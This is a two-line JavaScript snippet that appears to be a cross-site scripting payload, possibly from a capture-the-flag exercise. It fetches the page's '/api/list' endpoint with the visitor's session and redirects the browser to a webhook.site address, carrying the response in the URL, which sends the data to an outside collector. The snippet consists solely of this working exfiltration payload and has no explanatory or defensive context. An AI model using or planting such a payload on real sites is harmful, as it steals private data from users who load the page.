fetch('/api/list').then(r=>r.text())
        .then(r=>location = "https://webhook.site/4dde5d33-25b7-4562-b23f-23e2422d7ca4/ost?c="+r)
